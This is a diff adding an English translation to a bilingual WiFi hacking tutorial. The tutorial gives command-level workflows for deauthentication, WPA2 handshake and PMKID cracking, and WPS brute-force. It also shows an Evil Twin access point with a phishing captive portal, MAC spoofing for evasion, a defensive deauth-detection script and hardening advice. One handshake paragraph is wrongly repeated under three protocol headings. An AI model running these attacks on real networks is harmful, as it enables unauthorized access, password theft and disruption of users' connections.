@@ -1,3 +1,9 @@
+> 🌐 **Language / 언어**: [🇰🇷 한국어](#한국어) | [🇺🇸 English](#english)
+
+---
+
+<a name="한국어"></a>
+
 # WiFi 해킹 기초 이론
 
 ## 무선 네트워크 구조
@@ -723,3 +729,729 @@ WPA2 / WPA3 보안 강화:
 
 > **실습 환경에서만 수행하세요.**
 > Deauth 공격, Evil Twin은 타인의 네트워크에 수행 시 전파법 위반입니다.
+
+---
+
+<a name="english"></a>
+
+# WiFi Hacking Fundamentals
+
+## Wireless Network Architecture
+
+```
+WiFi Frame Types
+───────────────────────────────
+Management Frames
+  - Beacon: Broadcast that an AP uses to announce itself
+  - Probe Request: Client searching for an AP
+  - Probe Response: AP's reply to a probe request
+  - Authentication: Authentication exchange
+  - Association Request/Response: Connection request/response
+  - Deauthentication: Forced disconnection
+
+Control Frames
+  - RTS (Request to Send)
+  - CTS (Clear to Send)
+  - ACK (Acknowledgment)
+
+Data Frames
+  - Actual payload data
+───────────────────────────────
+```
+
+---
+
+## 1. History of Wireless Security Protocols
+
+### WEP (Wired Equivalent Privacy)
+
+```
+Introduced: 1997, 802.11 standard
+Status: Deprecated in 2004 (completely broken)
+
+Vulnerabilities:
+  - RC4 encryption with 24-bit IV reuse
+  - Reuse of same keystream → XOR attack
+  - CRC32 integrity check (cryptographically weak)
+
+Crack time: Under 5 minutes (after packet collection)
+Command: aircrack-ng -b BSSID capture.cap
+```
+
+### WPA (Wi-Fi Protected Access)
+
+Capturing the WPA2 handshake is the critical step in WPA2 cracking. Use `airodump-ng` to target the AP and `aireplay-ng --deauth` to force connected clients to reconnect, capturing the 4-way handshake.
+
+```
+Introduced: 2003 (emergency replacement for WEP)
+Encryption: TKIP (RC4-based with improved IV)
+
+Vulnerabilities:
+  - TKIP vulnerability (Beck-Tews Attack)
+  - Michael MIC attack
+  - WPA Enterprise: PEAP vulnerability
+
+Status: Deprecated since 2012
+```
+
+### WPA2 (Wi-Fi Protected Access 2)
+
+Capturing the WPA2 handshake is the critical step in WPA2 cracking. Use `airodump-ng` to target the AP and `aireplay-ng --deauth` to force connected clients to reconnect, capturing the 4-way handshake.
+
+```
+Introduced: 2004
+Encryption: CCMP/AES (strong encryption)
+Authentication: PSK (Personal) or Enterprise (802.1X)
+
+Vulnerabilities:
+  - KRACK (Key Reinstallation Attack, 2017)
+  - PMKID Attack (2018, no handshake required)
+  - Weak password dictionary attacks
+  - WPS PIN brute-force
+
+Status: Currently dominant, transitioning to WPA3
+```
+
+### WPA3
+
+Capturing the WPA2 handshake is the critical step in WPA2 cracking. Use `airodump-ng` to target the AP and `aireplay-ng --deauth` to force connected clients to reconnect, capturing the 4-way handshake.
+
+```
+Introduced: 2018
+Improvements:
+  - SAE (Simultaneous Authentication of Equals)
+    → Dragonfly handshake
+    → Prevents offline dictionary attacks
+  - Forward Secrecy (protects past traffic)
+  - 192-bit encryption suite (Enterprise)
+  - PMF (Protected Management Frames) mandatory
+
+Known vulnerabilities:
+  - Dragonblood (SAE side-channel, 2019)
+  - Downgrade attacks on WPA3 transition networks
+```
+
+---
+
+## 2. Wireless Network Scanning
+
+### Airmon-ng - Monitor Mode
+
+Use airmon-ng to check wireless interfaces and enable monitor mode. You must switch to monitor mode before packet capture and injection.
+
+```bash
+# Check wireless interfaces
+iwconfig
+ip link show
+
+# Enable monitor mode
+sudo airmon-ng start wlan0
+# → Creates wlan0mon or mon0 interface
+
+# Kill interfering processes
+sudo airmon-ng check kill
+
+# Lock to a specific channel
+sudo iwconfig wlan0mon channel 6
+
+# Disable monitor mode
+sudo airmon-ng stop wlan0mon
+```
+
+### Airodump-ng - Packet Capture
+
+Use airodump-ng to scan all nearby wireless APs and clients. Collects information including BSSID, ESSID, channel, encryption type, and signal strength.
+
+```bash
+# Scan all APs
+sudo airodump-ng wlan0mon
+
+# Scan a specific channel
+sudo airodump-ng --channel 1 wlan0mon
+
+# Focused capture on a specific BSSID (handshake collection)
+sudo airodump-ng \
+    --bssid AA:BB:CC:DD:EE:FF \
+    --channel 6 \
+    --write capture \
+    wlan0mon
+
+# Scan 5GHz band
+sudo airodump-ng --band a wlan0mon
+
+# Output field descriptions
+# BSSID: AP's MAC address
+# PWR: Signal strength (dBm, larger negative = weaker)
+# Beacons: Number of beacon frames received
+# #Data: Number of data packets collected
+# CH: Channel
+# MB: Maximum speed (Mbps)
+# ENC: Encryption type
+# ESSID: Network name
+```
+
+### Kismet - Advanced Wireless Reconnaissance
+
+Install and run the Kismet wireless network detector. Provides advanced wireless reconnaissance features including hidden SSID discovery, unauthorized AP detection, and client tracking.
+
+```bash
+# Install and run Kismet
+sudo apt install kismet
+sudo kismet -c wlan0mon
+
+# Web interface: http://localhost:2501
+# Default credentials: kismet/kismet
+
+# Analyze Kismet capture results
+kismetdb_to_pcap --in wardriving.kismet --out capture.pcap
+```
+
+---
+
+## 3. Understanding the WPA2 Handshake
+
+### 4-Way Handshake Process
+
+```
+Client                               AP
+   │                                  │
+   │  1. EAPOL-Key (ANonce)           │
+   │◄─────────────────────────────────│
+   │                                  │
+   │  2. EAPOL-Key (SNonce + MIC)     │
+   │─────────────────────────────────►│
+   │                                  │
+   │  3. EAPOL-Key (GTK + MIC)        │
+   │◄─────────────────────────────────│
+   │                                  │
+   │  4. EAPOL-Key (ACK)              │
+   │─────────────────────────────────►│
+
+Key concepts:
+  PMK (Pairwise Master Key) = PBKDF2(PSK, SSID)
+  PTK = PRF(PMK + ANonce + SNonce + AP_MAC + Client_MAC)
+  MIC = HMAC-MD5/SHA1(PTK, EAPOL data)
+
+Cracking principle:
+  Compute PMK using known SSID + dictionary word
+  → Compute PTK
+  → Verify MIC
+  → Password found if MIC matches
+```
+
+### Deauthentication Attack (Forced Handshake Collection)
+
+Use aireplay-ng to send Deauthentication packets to a specific client. Forces reconnection to capture the WPA2 4-way handshake.
+
+```bash
+# Send Deauth packets to a specific client
+sudo aireplay-ng \
+    --deauth 10 \
+    -a AA:BB:CC:DD:EE:FF \  # AP MAC
+    -c 11:22:33:44:55:66 \  # Client MAC
+    wlan0mon
+
+# Broadcast Deauth to all clients
+sudo aireplay-ng \
+    --deauth 0 \           # 0=infinite
+    -a AA:BB:CC:DD:EE:FF \ # AP MAC
+    wlan0mon
+
+# Capture handshake simultaneously with Deauth (separate terminal)
+sudo airodump-ng \
+    --bssid AA:BB:CC:DD:EE:FF \
+    --channel 6 \
+    --write handshake \
+    wlan0mon
+
+# Verify handshake in capture file
+aircrack-ng handshake-01.cap
+```
+
+---
+
+## 4. WPS (Wi-Fi Protected Setup) Vulnerabilities
+
+### WPS PIN Brute-Force
+
+Perform WPS PIN brute-force using Reaver or Bully. Systematically attempts the 8-digit PIN on WPS-enabled APs to recover the WPA2 key.
+
+```bash
+# Find WPS-enabled APs
+sudo wash -i wlan0mon
+# Locked: No → attack possible
+
+# Crack WPS PIN with Reaver
+sudo reaver \
+    -i wlan0mon \
+    -b AA:BB:CC:DD:EE:FF \
+    -v \
+    -c 6 \
+    --delay=2           # Delay to prevent lockout
+
+# Pixiewps (Pixie Dust Attack) - fast offline attack
+sudo reaver \
+    -i wlan0mon \
+    -b AA:BB:CC:DD:EE:FF \
+    -K 1 \              # Enable Pixie Dust
+    -v \
+    -d 30
+
+# Theory: WPS PIN is 8 digits but verified in two 4-digit halves
+# Total possible combinations: 11,000 (10,000 + 1,000)
+# All PINs can be tried in approximately 4 hours
+```
+
+---
+
+## 5. Evil Twin (Rogue AP) Attack
+
+### Basic Evil Twin Setup
+
+Basic configuration for creating an Evil Twin AP that clones a legitimate AP. Creates a rogue AP with hostapd and provides DHCP/DNS with dnsmasq.
+
+```bash
+# 1. Collect information about the legitimate AP
+sudo airodump-ng wlan0mon
+# Record SSID, BSSID, Channel, ENC information
+
+# 2. Force disconnect clients from the target AP
+sudo aireplay-ng --deauth 100 -a BSSID_TARGET wlan0mon
+
+# 3. Create rogue AP with same SSID (Hostapd)
+cat > /tmp/hostapd.conf << 'EOF'
+interface=wlan1
+driver=nl80211
+ssid=TARGET_SSID
+channel=6
+hw_mode=g
+EOF
+
+sudo hostapd /tmp/hostapd.conf &
+
+# 4. Configure DHCP server
+sudo apt install dnsmasq
+cat > /tmp/dnsmasq.conf << 'EOF'
+interface=wlan1
+dhcp-range=192.168.1.2,192.168.1.30,255.255.255.0,12h
+dhcp-option=3,192.168.1.1
+dhcp-option=6,192.168.1.1
+server=8.8.8.8
+log-queries
+log-dhcp
+EOF
+
+sudo dnsmasq -C /tmp/dnsmasq.conf
+
+# 5. IP forwarding and NAT
+sudo ip addr add 192.168.1.1/24 dev wlan1
+sudo sysctl net.ipv4.ip_forward=1
+sudo iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE
+sudo iptables -A FORWARD -i wlan1 -j ACCEPT
+```
+
+### Captive Portal Setup
+
+Configure a Captive Portal authentication page using the Apache web server. Directs victims connected to the Evil Twin AP to a phishing page to steal their Wi-Fi password.
+
+```bash
+# Apache web server + phishing page
+sudo apt install apache2
+cat > /var/www/html/index.html << 'EOF'
+<!DOCTYPE html>
+<html>
+<head><title>WiFi Login</title></head>
+<body>
+<h2>WiFi Network Re-Authentication</h2>
+<form method="POST" action="/capture.php">
+  <p>Network Password:</p>
+  <input type="password" name="password" placeholder="WiFi Password">
+  <button type="submit">Connect</button>
+</form>
+</body>
+</html>
+EOF
+
+# DNS redirection (redirect all queries to the rogue page)
+cat >> /tmp/dnsmasq.conf << 'EOF'
+address=/#/192.168.1.1
+EOF
+
+# Redirect HTTP traffic with iptables
+sudo iptables -t nat -A PREROUTING -i wlan1 -p tcp --dport 80 \
+    -j DNAT --to-destination 192.168.1.1:80
+sudo iptables -t nat -A PREROUTING -i wlan1 -p tcp --dport 443 \
+    -j DNAT --to-destination 192.168.1.1:443
+```
+
+---
+
+## 6. Wireless Tools Quick Reference
+
+The core tools of the aircrack-ng suite. Use `airmon-ng` to switch the wireless card to monitor mode, `airodump-ng` to scan nearby APs and clients, and `aireplay-ng` for packet injection (deauth, etc.).
+
+```
+airmon-ng    → Monitor mode management
+airodump-ng  → Packet capture / AP scanning
+aireplay-ng  → Packet injection (Deauth, ARP replay...)
+aircrack-ng  → WEP/WPA cracking
+airgraph-ng  → Network graph visualization
+
+kismet       → Comprehensive wireless IDS/sensor
+wash         → Scan for WPS-enabled APs
+reaver       → WPS PIN cracking
+pixiewps     → Pixie Dust offline attack
+wifite2      → Automated WiFi cracking
+airgeddon    → All-in-one wireless attack framework
+bettercap    → MITM/Evil Twin automation
+```
+
+---
+
+## 7. Lab Environment Setup
+
+```python
+#!/usr/bin/env python3
+"""
+Scapy-based WiFi AP Scanner and Deauthentication Detection Tool
+Usage: sudo python3 wifi_scanner.py --iface wlan0mon [--timeout 30] [--detect-deauth]
+Note: Requires a monitor mode interface (airmon-ng start wlan0)
+"""
+
+from __future__ import annotations
+
+import argparse
+import signal
+import sys
+import time
+from collections import Counter, defaultdict
+from dataclasses import dataclass, field
+from datetime import datetime
+from typing import Optional
+
+try:
+    from scapy.all import sniff, conf
+    from scapy.layers.dot11 import (
+        Dot11, Dot11Beacon, Dot11Elt, Dot11Deauth,
+        Dot11Disas, Dot11ProbeReq, RadioTap,
+    )
+    HAS_SCAPY = True
+except ImportError:
+    HAS_SCAPY = False
+
+
+# ------------------------------------------------------------------ #
+#  Data Structures
+# ------------------------------------------------------------------ #
+@dataclass
+class APInfo:
+    bssid: str
+    ssid: str
+    channel: int
+    rssi: int
+    enc: str
+    vendor: str = ""
+    first_seen: str = field(default_factory=lambda: datetime.now().strftime("%H:%M:%S"))
+    last_seen: str = field(default_factory=lambda: datetime.now().strftime("%H:%M:%S"))
+    beacon_count: int = 0
+
+
+@dataclass
+class DeauthAlert:
+    timestamp: str
+    src_mac: str
+    dst_mac: str
+    bssid: str
+    reason_code: int
+    frame_type: str  # Deauth | Disassoc
+
+    _REASON_CODES = {
+        1: "Unspecified reason",
+        2: "Previous auth no longer valid",
+        3: "Deauth leaving BSS",
+        4: "Inactivity",
+        7: "Class 3 frame received (most common spoofing code)",
+        8: "Disassoc leaving BSS",
+    }
+
+    def reason_str(self) -> str:
+        return self._REASON_CODES.get(self.reason_code, f"Code {self.reason_code}")
+
+
+# ------------------------------------------------------------------ #
+#  Scanner
+# ------------------------------------------------------------------ #
+class WiFiScanner:
+    def __init__(self, iface: str, detect_deauth: bool = False) -> None:
+        self.iface = iface
+        self.detect_deauth = detect_deauth
+        self.aps: dict[str, APInfo] = {}
+        self.deauth_alerts: list[DeauthAlert] = []
+        self.deauth_counter: Counter = Counter()
+        self._stop = False
+
+    # ── Packet Handler ────────────────────────────────────────────────
+    def _handle(self, pkt) -> None:
+        if not pkt.haslayer(Dot11):
+            return
+
+        # Process AP Beacon
+        if pkt.haslayer(Dot11Beacon):
+            self._process_beacon(pkt)
+
+        # Detect Deauth / Disassoc
+        if self.detect_deauth:
+            if pkt.haslayer(Dot11Deauth) or pkt.haslayer(Dot11Disas):
+                self._process_deauth(pkt)
+
+    def _process_beacon(self, pkt) -> None:
+        dot11 = pkt[Dot11]
+        bssid = dot11.addr2 or ""
+        if not bssid:
+            return
+
+        # Extract SSID
+        ssid = ""
+        channel = 0
+        enc = "OPEN"
+        elt = pkt.getlayer(Dot11Elt)
+        while elt:
+            if elt.ID == 0:    # SSID
+                try:
+                    ssid = elt.info.decode("utf-8", errors="replace")
+                except Exception:
+                    ssid = "[binary]"
+            elif elt.ID == 3:  # DS Parameter Set (channel)
+                try:
+                    channel = int.from_bytes(elt.info, "little")
+                except Exception:
+                    pass
+            elif elt.ID == 48: # RSN Information (WPA2)
+                enc = "WPA2"
+            elif elt.ID == 221 and elt.info[:4] == b"\x00\x50\xf2\x01":  # WPA1
+                if enc != "WPA2":
+                    enc = "WPA"
+            elt = elt.payload.getlayer(Dot11Elt) if elt.payload else None
+
+        # Signal strength from RadioTap
+        rssi = 0
+        if pkt.haslayer(RadioTap):
+            rssi = getattr(pkt[RadioTap], "dBm_AntSignal", 0) or 0
+
+        ts = datetime.now().strftime("%H:%M:%S")
+        if bssid in self.aps:
+            ap = self.aps[bssid]
+            ap.last_seen = ts
+            ap.beacon_count += 1
+            ap.rssi = rssi
+        else:
+            self.aps[bssid] = APInfo(
+                bssid=bssid, ssid=ssid or "(hidden)",
+                channel=channel, rssi=rssi, enc=enc,
+            )
+            print(f"  [+] AP: {ssid or '(hidden)':<30} BSSID:{bssid}  CH:{channel:2d}  {enc}  RSSI:{rssi}dBm")
+
+    def _process_deauth(self, pkt) -> None:
+        dot11 = pkt[Dot11]
+        src = dot11.addr2 or "??"
+        dst = dot11.addr1 or "??"
+        bssid = dot11.addr3 or src
+
+        layer = pkt[Dot11Deauth] if pkt.haslayer(Dot11Deauth) else pkt[Dot11Disas]
+        frame_type = "Deauth" if pkt.haslayer(Dot11Deauth) else "Disassoc"
+        reason = getattr(layer, "reason", 0)
+
+        alert = DeauthAlert(
+            timestamp=datetime.now().strftime("%H:%M:%S"),
+            src_mac=src,
+            dst_mac=dst,
+            bssid=bssid,
+            reason_code=reason,
+            frame_type=frame_type,
+        )
+        self.deauth_alerts.append(alert)
+        self.deauth_counter[src] += 1
+
+        # 10 or more per second → attack alert
+        count = self.deauth_counter[src]
+        warning = " [!!! DEAUTH ATTACK DETECTED !!!]" if count >= 10 else ""
+        print(
+            f"  [{alert.timestamp}] {frame_type:8s} {src} → {dst}  "
+            f"Reason:{alert.reason_str()}  Total:{count}{warning}"
+        )
+
+    # ── Start Scan ────────────────────────────────────────────────────
+    def start(self, timeout: int = 0) -> None:
+        def _sigint(sig, frame):
+            print("\n[*] Scan interrupted...", file=sys.stderr)
+            self._stop = True
+
+        signal.signal(signal.SIGINT, _sigint)
+        print(f"[*] WiFi scan started: {self.iface}", file=sys.stderr)
+        if self.detect_deauth:
+            print("[*] Deauth/Disassoc detection enabled", file=sys.stderr)
+
+        sniff(
+            iface=self.iface,
+            prn=self._handle,
+            store=False,
+            timeout=timeout if timeout > 0 else None,
+            stop_filter=lambda _: self._stop,
+        )
+
+    def print_summary(self) -> None:
+        print(f"\n{'='*65}")
+        print(f"APs discovered: {len(self.aps)}")
+        print(f"\n{'BSSID':<20} {'SSID':<30} {'CH':>4} {'ENC':<6} {'RSSI':>6}")
+        print("-" * 70)
+        for ap in sorted(self.aps.values(), key=lambda a: -a.rssi):
+            print(f"{ap.bssid:<20} {ap.ssid:<30} {ap.channel:>4} {ap.enc:<6} {ap.rssi:>5}dBm")
+
+        if self.deauth_alerts:
+            print(f"\nDeauth/Disassoc detected: {len(self.deauth_alerts)} events")
+            print("\n[Top senders]")
+            for mac, cnt in self.deauth_counter.most_common(5):
+                label = " ← suspected attacker" if cnt >= 10 else ""
+                print(f"  {mac}  {cnt} times{label}")
+
+
+# ------------------------------------------------------------------ #
+#  CLI
+# ------------------------------------------------------------------ #
+def build_parser() -> argparse.ArgumentParser:
+    parser = argparse.ArgumentParser(
+        description="Scapy-based WiFi AP Scanner and Deauth Detection Tool",
+        formatter_class=argparse.RawDescriptionHelpFormatter,
+        epilog="Examples:\n"
+               "  sudo python3 wifi_scanner.py --iface wlan0mon\n"
+               "  sudo python3 wifi_scanner.py --iface wlan0mon --timeout 60 --detect-deauth",
+    )
+    parser.add_argument(
+        "--iface", required=True,
+        help="Monitor mode wireless interface (e.g.: wlan0mon)",
+    )
+    parser.add_argument(
+        "--timeout", type=int, default=0,
+        metavar="SEC",
+        help="Scan duration in seconds. 0=infinite (default: 0)",
+    )
+    parser.add_argument(
+        "--detect-deauth", action="store_true",
+        help="Enable Deauthentication/Disassociation packet detection",
+    )
+    return parser
+
+
+def main() -> None:
+    if not HAS_SCAPY:
+        print("scapy library required: pip install scapy", file=sys.stderr)
+        sys.exit(1)
+
+    parser = build_parser()
+    args = parser.parse_args()
+
+    scanner = WiFiScanner(iface=args.iface, detect_deauth=args.detect_deauth)
+    scanner.start(timeout=args.timeout)
+    scanner.print_summary()
+
+
+if __name__ == "__main__":
+    main()
+```
+
+---
+
+## 8. MAC Address Spoofing (Maintaining Anonymity)
+
+### Reasons and Methods for Changing MAC Address
+
+Use macchanger to change your MAC address to make tracking difficult during wireless attacks. Hiding your real MAC address before an attack is a fundamental operational security (opsec) practice.
+
+```bash
+# What is a MAC address?
+# A unique hardware-level identifier assigned to a network interface
+# Used to deliver packets to the correct device
+# MAC addresses are logged in network logs → traceable
+
+# Change MAC address with macchanger (built into Kali)
+sudo ifconfig wlan0 down                  # Disable interface
+sudo macchanger --random wlan0            # Set random MAC
+sudo macchanger -m AA:BB:CC:DD:EE:FF wlan0  # Set specific MAC
+sudo ifconfig wlan0 up                    # Re-enable interface
+
+# Verify change
+macchanger --show wlan0
+# Permanent MAC: Original hardware MAC
+# Current MAC: Currently active (changed) MAC
+
+# Change using ip command (modern method)
+sudo ip link set wlan0 down
+sudo ip link set wlan0 address AA:BB:CC:DD:EE:FF
+sudo ip link set wlan0 up
+```
+
+---
+
+## 9. WPA2 Cracking in Practice — From Handshake Collection to Crack
+
+### Step-by-Step Full Workflow
+
+The complete step-by-step procedure for wireless hacking. Proceeds in order: enable monitor mode → scan APs → capture handshake → offline cracking.
+
+```bash
+# Step 1: Enable monitor mode + change MAC
+sudo airmon-ng check kill
+sudo airmon-ng start wlan0
+# → Creates wlan0mon
+
+# Step 2: Scan for target AP
+sudo airodump-ng wlan0mon
+# Record BSSID and CH (channel)
+
+# Step 3: Capture handshake
+sudo airodump-ng --bssid AA:BB:CC:DD:EE:FF --channel 6 --write capture wlan0mon
+
+# Step 4: (Different terminal) Force reconnection with Deauth
+sudo aireplay-ng --deauth 5 -a AA:BB:CC:DD:EE:FF wlan0mon
+# → Handshake is captured when client reconnects
+# → "WPA handshake: AA:BB:CC:DD:EE:FF" appears in top-right of airodump-ng screen
+
+# Step 5: Crack the handshake
+aircrack-ng -w /usr/share/wordlists/rockyou.txt capture-01.cap
+# Or GPU-accelerated cracking with hashcat
+hcxtools/hcxpcapngtool -o hash.hc22000 capture-01.cap
+hashcat -a 0 -m 22000 hash.hc22000 wordlist.txt
+```
+
+### PMKID Attack (Clientless Cracking — 2018)
+
+The PMKID attack extracts the PMKID from an AP without any client connection, enabling offline WPA2 key cracking. Discovered in 2018, this technique is more efficient than capturing a handshake.
+
+```bash
+# PMKID can be collected from an AP even without a connected client
+# Uses hcxdumptool
+
+sudo hcxdumptool -i wlan0mon -o pmkid.pcapng --enable_status=1
+
+# Extract PMKID
+hcxtools/hcxpcapngtool -o hash.hc22000 pmkid.pcapng
+
+# Crack with hashcat (22000 = WPA-PMKID-PBKDF2)
+hashcat -a 0 -m 22000 hash.hc22000 /usr/share/wordlists/rockyou.txt
+hashcat -a 3 -m 22000 hash.hc22000 ?d?d?d?d?d?d?d?d  # 8-digit numeric brute-force
+```
+
+### Network Security Hardening Recommendations (Defensive Perspective)
+```
+WPA2 / WPA3 Security Hardening:
+  1. Use strong passwords (20+ characters, mixed case + numbers + special characters)
+  2. Use WPA3 SAE mode (Dragonfly handshake — prevents offline dictionary attacks)
+  3. Disable WPS (vulnerable to PIN brute-force)
+  4. Enable PMF (Protected Management Frames) — defends against Deauth attacks
+  5. Use 802.1X Enterprise authentication (corporate environments)
+  6. Hiding SSID is pointless (detectable via Probe Requests)
+  7. MAC filtering is bypassable via MAC spoofing → not sufficient as a standalone defense
+```
+
+> **Perform only in lab/test environments.**
+> Deauth attacks and Evil Twin attacks on third-party networks violate radio communications laws.
